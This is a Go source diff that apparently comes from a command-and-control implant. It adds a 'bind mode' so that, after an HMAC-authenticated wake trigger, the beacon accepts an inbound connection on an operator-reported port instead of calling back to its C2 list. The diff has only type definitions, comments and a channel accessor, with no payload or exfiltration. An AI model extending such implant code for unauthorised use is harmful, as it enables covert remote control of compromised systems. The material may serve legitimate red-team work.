@@ -37,6 +37,12 @@ package transports
 	                    passes this to StartConnectionLoop as a temporary C2
 	                    override, allowing the operator to specify the callback
 	                    target at wake time rather than at build time.
+	  - BindMode:      when true, the runner should NOT dial out. Instead it
+	                    accepts a connection on BindListener and establishes
+	                    a session over the inbound connection (bind transport).
+	  - BindListener:  the already-opened TCP listener. The triggerwake
+	                    handler opens it (so it can report the actual port
+	                    back to the operator), then hands it here.
 
 	An empty TransportHint means "try all transports in the configured
 	order". An empty CallbackURL means "use the baked-in C2 list".
@@ -48,6 +54,8 @@ package transports
 	exists but never gets a sender; the runner's select harmlessly
 	ignores its branch.
 */
+
+import "net"
 
 // WakeInfo carries the operator's instructions from a wake trigger
 // to the runner loop. Sent over the wake channel.
@@ -62,6 +70,26 @@ type WakeInfo struct {
 	// bypassing the baked-in C2 list. Protected by the trigger packet's
 	// HMAC — only an operator with the shared secret can set this.
 	CallbackURL string
+
+	// BindMode, when true, indicates the wake was triggered by a
+	// "bind" intent. The runner should NOT call StartConnectionLoop.
+	// Instead, it should accept a connection on BindListener and
+	// establish a session using the bind transport.
+	BindMode bool
+
+	// BindListener is the already-opened TCP/KCP listener for bind mode.
+	// The triggerwake handler opens it (to determine and report the
+	// actual port), then passes ownership here. The runner accepts
+	// one connection, negotiates yamux, and enters sessionMainLoop.
+	// Non-nil only when BindMode is true. The runner is responsible
+	// for closing it.
+	BindListener net.Listener
+
+	// BindSecret is the shared HMAC secret used for the bind auth
+	// handshake. Copied from the triggerwake Config.Secret so the
+	// runner can perform the HMAC challenge-response and derive the
+	// session encryption key.
+	BindSecret []byte
 }
 
 var wakeNow = make(chan WakeInfo, 1)
@@ -75,6 +103,14 @@ func WakeNow(info WakeInfo) {
 	default:
 		// already signaled; coalesce.
 	}
+}
+
+// WakeNowChan returns the write end of the wake channel for callers
+// that need select-based send semantics (e.g., detecting a full channel
+// to clean up resources like bind listeners). Most callers should use
+// WakeNow() instead.
+func WakeNowChan() chan<- WakeInfo {
+	return wakeNow
 }
 
 // WakeChannel returns the read end of the wake signal. The beacon
